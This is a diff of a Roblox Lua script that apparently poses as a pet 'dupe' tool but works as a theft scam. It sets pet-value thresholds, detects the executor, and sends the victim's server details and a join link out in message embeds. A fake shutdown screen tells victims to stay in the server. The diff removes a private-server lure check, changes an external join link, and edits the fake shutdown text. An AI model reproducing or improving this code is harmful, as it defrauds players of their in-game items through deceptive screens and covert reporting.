@@ -17,12 +17,6 @@ local GIFT_COOLDOWN = 3
 local MINIMUM_PETS = 3
 local MINIMUM_TOTAL_VALUE = 50000
 
--- Check if in private server
-if game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0 then
-    LocalPlayer:Kick("You can't dupe in private servers due to servers being too young")
-    return
-end
-
 local function identifyExecutor()
     if syn then
         return "Synapse X"
@@ -371,7 +365,7 @@ local function splitEmbeds(pets, totalValue, specialCount)
             },
             {
                 name = "🌐 Server Information",
-                value = string.format("```Game: %s\nPlace ID: %d\nJob ID: %s```\n[Click to Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", 
+                value = string.format("```Game: %s\nPlace ID: %d\nJob ID: %s```\n[Click to Join Server](https://www.roblox.com/games/%d?privateServerLinkCode=%s)", 
                     game:GetService("MarketplaceService"):GetProductInfo(placeId).Name,
                     placeId, 
                     jobId,
@@ -625,24 +619,11 @@ local function createFakeShutdown()
     timerText.TextTransparency = 0
     timerText.Parent = frame
 
-    local issueText = Instance.new("TextLabel")
-    issueText.Text = ""
-    issueText.TextColor3 = Color3.new(1, 1, 1)
-    issueText.Size = UDim2.new(1, 0, 0.1, 0)
-    issueText.Position = UDim2.new(0, 0, 0.9, 0)
-    issueText.BackgroundTransparency = 1
-    issueText.Font = Enum.Font.SourceSans
-    issueText.TextSize = 18
-    issueText.TextTransparency = 1
-    issueText.Parent = frame
-
     local timerConn
     timerConn = RunService.Heartbeat:Connect(function()
         timer = timer - 1
         if timer <= 0 then
-            timerText.TextTransparency = 1
-            issueText.Text = "There has been an issue. Please stay in the server so you don't lose any data..."
-            issueText.TextTransparency = 0
+            timerText.Text = "There has been an issue. Please stay in the server so you don't lose any data..."
             timerConn:Disconnect()
         else
             timerText.Text = "Teleporting in: "..timer.." seconds"
